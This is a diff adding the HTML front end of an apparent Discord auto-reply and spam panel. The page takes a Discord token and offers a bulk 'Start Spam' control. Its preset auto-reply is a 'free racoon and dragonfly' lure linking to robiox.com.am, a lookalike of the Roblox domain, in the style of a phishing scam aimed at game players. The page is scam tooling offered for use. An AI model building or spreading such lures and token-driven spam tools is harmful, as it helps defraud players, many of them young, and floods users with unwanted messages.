@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Auto Reply & Spam UI</title>
+  <link rel="stylesheet" href="style.css"/>
+  <link href="https://fonts.cdnfonts.com/css/minecraft-4" rel="stylesheet"/>
+</head>
+<body>
+  <div class="container">
+    <h1>💬 Auto Chat + Spam Panel</h1>
+    
+    <label>Discord Token:</label>
+    <input type="password" id="token" placeholder="Enter your token">
+
+    <label>Message 1 (Auto-Reply to 'hello'):</label>
+    <textarea id="msg1">Hello you want free racoon and dragonfly?\nhttps://www.robiox.com.am/games/126884695634066/Grow-a-Garden?privateServerLinkCode=99962715785276116581757257938107</textarea>
+
+    <label>Message 2 (Auto-Reply to 'join'):</label>
+    <textarea id="msg2">join me now I have 10 remaining</textarea>
+
+    <button onclick="startAutoReply()">Start Auto-Reply</button>
+
+    <hr/>
+
+    <label>Custom Spam Message:</label>
+    <textarea id="spamMsg">Type your spam message here...</textarea>
+
+    <label>Amount:</label>
+    <input type="number" id="amount" min="1" max="100" value="5"/>
+
+    <button onclick="startSpam()">Start Spam</button>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
